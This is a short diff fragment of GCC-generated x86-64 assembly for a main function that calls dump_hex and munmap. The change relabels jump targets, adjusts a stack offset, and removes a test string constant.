 	movq	%rcx, %rdi
 	call	dump_hex
-.L39:
-	movl	-248(%rbp), %eax
+.L42:
+	movl	-244(%rbp), %eax
 	sall	$8, %eax
 	movslq	%eax, %rdx
 	movq	-216(%rbp), %rax
@@ -9050,12 +9074,12 @@ main:
 	movq	%rax, %rdi
 	call	munmap@PLT
 	movl	$0, %eax
-.L34:
+.L47:
 	movq	-24(%rbp), %rdx
 	subq	%fs:40, %rdx
-	je	.L44
+	je	.L48
 	call	__stack_chk_fail@PLT
-.L44:
+.L48:
 	movq	-8(%rbp), %rbx
 	leave
 	.cfi_def_cfa 7, 8
@@ -9063,15 +9087,6 @@ main:
 	.cfi_endproc
 .LFE14:
 	.size	main, .-main
-	.section	.rodata
-.LC7:
-	.string	"Hmm, this does really work!"
-	.section	.data.rel.local,"aw"
-	.align 8
-	.type	test.0, @object
-	.size	test.0, 8
-test.0:
-	.quad	.LC7
 	.ident	"GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0"
 	.section	.note.GNU-stack,"",@progbits
 	.section	.note.gnu.property,"a"
